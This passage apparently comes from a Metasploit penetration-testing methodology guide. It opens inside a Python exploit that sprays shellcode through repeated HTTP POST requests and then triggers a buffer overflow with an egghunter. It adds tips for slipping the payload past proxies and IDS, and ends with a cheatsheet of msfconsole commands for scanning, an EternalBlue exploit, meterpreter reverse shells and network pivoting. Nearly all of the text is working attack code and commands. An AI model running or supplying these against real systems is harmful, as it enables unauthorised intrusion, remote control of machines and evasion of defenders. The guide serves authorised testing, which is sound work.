body = shellcode
spray = (
    b'POST <APP_PATH> HTTP/1.1\r\n'
    b'Host: ' + target.encode() + b'\r\n'
    b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
    b'\r\n' + body
)
for _ in range(20):
    s = remote(target, port); s.send(spray); s.close()

# Stage B: trigger BOF on vulnerable verb, land egghunter in tiny buffer
trigger = (
    b'<VULN_VERB> '
    + b'A' * (buflen - len(egghunter))
    + egghunter
    + jmp_reg
    + b' HTTP/1.1\r\n\r\n'
)
s = remote(target, port); s.send(trigger); s.close()
```

> **Tip:** When the spray ingress is behind a normalising proxy that strips raw bytes, gzip the body with `zlib.compress(body)` and set `Content-Encoding: gzip` so the proxy treats it as an opaque blob.

> **OPSEC:** Uniform `Content-Length` across spray requests is a trivial IDS pattern — pad with random bytes when RoE requires lower noise.

Placeholders used: `<TARGET>`, `<ATTACKER_IP>`, `<ATTACKER_PORT>`, `<BUF_OFFSET>`, `<JMP_GADGET>`, `<EGG_TAG>`, `<EGGHUNTER_BYTES>`, `<MSFVENOM_SHELLCODE>`, `<APP_PATH>`, `<VULN_VERB>`.

[↑ Back to top](#metasploit-framework-methodology)

---

## Quick Reference Cheatsheet

```text
# Spin up DB-backed workspace and import
msfconsole -q
msf6 > workspace -a client01
msf6 > db_nmap -sV -sC -p- <SUBNET>

# Search/use/run
msf6 > search cve:2017-0144
msf6 > use 0
msf6 > setg LHOST tun0
msf6 > set RHOSTS <TARGET>
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LPORT 443
msf6 > check
msf6 > exploit -j -z

# Persistent handler for sprays
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > setg ExitOnSession false
msf6 > exploit -j -z

# Pivot
meterpreter > run autoroute -s 172.16.50.0/24
meterpreter > bg
msf6 > use auxiliary/server/socks_proxy
msf6 > set VERSION 5
msf6 > run -j
# /etc/proxychains4.conf -> socks5 127.0.0.1 1080
```
